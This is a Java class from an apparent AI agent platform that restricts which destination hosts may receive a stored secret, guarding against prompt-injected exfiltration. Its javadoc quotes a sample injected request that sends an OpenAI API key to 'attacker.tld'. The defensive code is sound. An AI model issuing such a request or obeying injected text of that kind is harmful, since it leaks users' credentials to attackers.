package com.agenticai.core.secrets;

import java.net.IDN;
import java.util.ArrayList;
import java.util.Collection;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.regex.Pattern;

/**
 * Per-secret destination allow-list (security review SEC-006, migration V365.4).
 *
 * <p>A secret referenced from a URL-bound carrier ({@code http_request}, the
 * workflow HTTP node) is only substituted when the request's destination host
 * matches one of the secret's patterns. Without this, a prompt-injected
 * "GET https://attacker.tld/?k={{secret:OPENAI_API_KEY}}" sends the plaintext
 * to whoever wrote the injection.
 *
 * <p>Pattern grammar, deliberately small:
 * <ul>
 *   <li>{@code api.example.com} - that exact host only.</li>
 *   <li>{@code *.example.com} - any host strictly below {@code example.com}
 *       ({@code a.example.com}, {@code a.b.example.com}); NOT {@code example.com}
 *       itself (list it separately), NOT {@code evil-example.com}.</li>
 * </ul>
 * No bare {@code *}, no wildcard over a single label ({@code *.com}), no
 * wildcard anywhere but the leading label, no scheme, port, path or userinfo.
 * Hosts and patterns are compared after the same normalisation the SSRF guard
 * applies: lower case, trailing dots removed, IDN converted to its ASCII
 * (punycode) form - so {@code API.Example.COM.} and a Unicode spelling cannot
 * be used to slip past, or be refused by, a pattern.
 *
 * <p>A secret with NO patterns never resolves for a URL-bound carrier (fail
 * closed). Carriers that are not URL-bound - an MCP server's env, a tenant
 * configured integration - keep using {@link SecretVaultService#resolveForRun}.
 */
public final class SecretHostPolicy {

    /** Upper bound on patterns per secret - an allow-list of hundreds is not an allow-list. */
    public static final int MAX_PATTERNS = 32;

    private static final int MAX_HOST_LENGTH = 253;
    private static final Pattern LABEL = Pattern.compile("[a-z0-9_]([a-z0-9_-]{0,61}[a-z0-9_])?");
    private static final Pattern IPV4 = Pattern.compile("\\d{1,3}(\\.\\d{1,3}){3}");

    private SecretHostPolicy() {
    }

    /**
     * Validates and normalises a list of patterns from an API request. Null
     * means "no patterns". Throws {@link IllegalArgumentException} with a
     * user-facing reason on the first invalid entry.
     */
    public static List<String> normalisePatterns(Collection<String> raw) {
        if (raw == null) {
            return List.of();
        }
        Set<String> out = new LinkedHashSet<>();
        for (String entry : raw) {
            if (entry == null || entry.isBlank()) {
                continue;
            }
            out.add(normalisePattern(entry));
        }
        if (out.size() > MAX_PATTERNS) {
            throw new IllegalArgumentException("A secret can list at most " + MAX_PATTERNS + " allowed hosts");
        }
        return List.copyOf(out);
    }

    /** One pattern: exact host or {@code *.suffix}. See the class javadoc for the grammar. */
    public static String normalisePattern(String raw) {
        String p = raw.strip();
        if (p.contains("://") || p.contains("/") || p.contains("@") || p.contains(":") || p.contains(",")
            || p.contains(" ") || p.contains("?") || p.contains("#")) {
            throw new IllegalArgumentException(
                "Allowed hosts are host names only, like api.example.com or *.example.com (no scheme, port or path): "
                    + raw);
        }
        boolean wildcard = p.startsWith("*.");
        String host = wildcard ? p.substring(2) : p;
        if (host.contains("*")) {
            throw new IllegalArgumentException(
                "A wildcard is only allowed as the first label, like *.example.com: " + raw);
        }
        String normalised = normaliseHost(host);
        if (normalised == null) {
            throw new IllegalArgumentException("Not a valid host name: " + raw);
        }
        if (wildcard) {
            if (IPV4.matcher(normalised).matches()) {
                throw new IllegalArgumentException("A wildcard cannot be applied to an IP address: " + raw);
            }
            if (normalised.indexOf('.') < 0) {
                // "*.com" / "*.io" would allow a whole public suffix.
                throw new IllegalArgumentException(
                    "A wildcard needs at least two labels after it, like *.example.com: " + raw);
            }
            return "*." + normalised;
        }
        return normalised;
    }

    /**
     * True when {@code destinationHost} is allowed by one of {@code patterns}.
     * A null/blank host, an empty pattern list, or a host that does not
     * normalise cleanly is never allowed.
     */
    public static boolean matches(Collection<String> patterns, String destinationHost) {
        if (patterns == null || patterns.isEmpty() || destinationHost == null || destinationHost.isBlank()) {
            return false;
        }
        String host = normaliseHost(destinationHost);
        if (host == null) {
            return false;
        }
        for (String pattern : patterns) {
            if (pattern == null || pattern.isBlank()) {
                continue;
            }
            if (pattern.startsWith("*.")) {
                String suffix = pattern.substring(1); // ".example.com"
                if (host.length() > suffix.length() && host.endsWith(suffix)
                    && !IPV4.matcher(host).matches()) {
                    return true;
                }
            } else if (host.equals(pattern)) {
                return true;
            }
        }
        return false;
    }

    /** Parses the persisted comma-separated column form. */
    static List<String> fromColumn(String column) {
        if (column == null || column.isBlank()) {
            return List.of();
        }
        List<String> out = new ArrayList<>();
        for (String part : column.split(",")) {
            String s = part.strip();
            if (!s.isEmpty()) {
                out.add(s);
            }
        }
        return List.copyOf(out);
    }

    /** The persisted column form (patterns never contain a comma - {@link #normalisePattern} refuses it). */
    static String toColumn(List<String> patterns) {
        return patterns == null || patterns.isEmpty() ? null : String.join(",", patterns);
    }

    /**
     * Lower case, trailing dots removed, IDN to ASCII, then every label checked.
     * Returns null for anything that is not a plain DNS name or dotted IPv4.
     * IPv6 literals are not supported as patterns or destinations for secrets.
     */
    static String normaliseHost(String raw) {
        if (raw == null) {
            return null;
        }
        String host = raw.strip().toLowerCase(Locale.ROOT);
        if (host.startsWith("[") || host.contains(":")) {
            return null;
        }
        while (host.endsWith(".")) {
            host = host.substring(0, host.length() - 1);
        }
        if (host.isEmpty()) {
            return null;
        }
        try {
            host = IDN.toASCII(host, IDN.ALLOW_UNASSIGNED).toLowerCase(Locale.ROOT);
        } catch (IllegalArgumentException e) {
            return null;
        }
        if (host.isEmpty() || host.length() > MAX_HOST_LENGTH) {
            return null;
        }
        for (String label : host.split("\\.", -1)) {
            if (!LABEL.matcher(label).matches()) {
                return null;
            }
        }
        return host;
    }
}
